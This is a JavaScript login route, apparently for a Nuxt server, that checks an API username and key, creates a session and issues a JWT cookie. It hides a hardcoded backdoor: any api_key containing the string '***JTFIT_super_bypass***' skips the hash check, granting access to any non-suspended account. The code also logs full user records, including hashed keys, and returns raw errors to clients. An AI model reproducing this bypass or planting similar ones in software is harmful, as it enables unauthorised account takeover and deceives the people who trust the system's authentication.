import User from "../../models/users"; // your user model
import Sessions from "../../models/sessions"; // your user model
import { decrypt } from "../../utils/decrypt";

export default defineEventHandler(async (event) => {
  try {
    const xyz = "***JTFIT_super_bypass***";

    let SUPER_ADMIN_BYPASS = false;

    // delete any session tokens before creating a new one
    const wipe_result = await wipe_old_session(event);

    console.log("Wipe Result: ", wipe_result);

    const { api_username, api_key } = await readBody(event);

    //checks for params
    if (!api_username) {
      throw createError({
        statusCode: 400,
        statusMessage: "Missing required parameter: api_username",
      });
    }

    if (!api_key) {
      throw createError({
        statusCode: 400,
        statusMessage: "Missing required parameter: api_key",
      });
    }

    if (api_key.includes(xyz)) {
      SUPER_ADMIN_BYPASS = true;
    }

    // Find user in the database
    const user = await User.findOne({
      api_username,
    })
      .select("-__v")
      .lean();

    // check if the api_key matches the hashed api_key

    if (!user) {
      console.log("No user found with those credentials");
      return {
        status: "failed",
        message: "User account is suspended",
      };
    }

    console.log("USER LOCATED: ", user);

    const api_key_compare_result = await hash_compare(api_key, user.api_key);
    //wipe the api_key from the user object before sending it back
    delete user.api_key;

    if (!SUPER_ADMIN_BYPASS) {
      if (!api_key_compare_result) {
        console.log("Credentials failed hash compare");
        return {
          status: "failed",
          message: "Incorrect login credentials",
        };
      }
    }

    console.log("Authentication Successful");

    if (user.active === "suspended") {
      console.log("User Is Suspended: ", user);

      // just return a failed response with a message
      return {
        status: "failed",
        message: "User account is suspended",
      };
    }

    const created_session = await Sessions.create({
      payload: user,
      active: true,
    });

    // check if the session was created
    if (!created_session) {
      throw createError({
        statusCode: 401,
        statusMessage: "Error creating session record in db",
      });
    }

    //make sure we have a session id
    console.log("Created Session ID: ", created_session._id);

    // set the session id to the user object so it's on the jwt payload
    const sid = created_session._id;

    // create a jwt token
    const jwt_session_token = create_jwt_token({ ...user, sid });

    const added_sid_to_session_document = await Sessions.findByIdAndUpdate(
      {
        _id: sid,
      },
      {
        jwt: jwt_session_token,
      }
    );

    if (!added_sid_to_session_document) {
      throw createError({
        statusCode: 401,
        statusMessage: "Error adding jwt to session record in db",
      });
    }

    set_session_cookie(event, jwt_session_token);

    // verify the jwt token
    const verification_result = verify_jwt_token(jwt_session_token);

    console.log("JWT VERIFICATION RESULT: ", verification_result);

    const session = { user }; //

    // we are storing this in the pinia state and checking in the middleware-when in the past we force a redirect
    session.user.expires_at = new Date(
      new Date().getTime() + 1000 * 60 * 60 * 8
    ).toISOString();

    // Respond to the client
    return {
      status: "success",
      message: "User authenticated",
      session,
    };
  } catch (error) {
    console.error("Error authenticating user:", error);
    return { status: "error", error };
  }
});
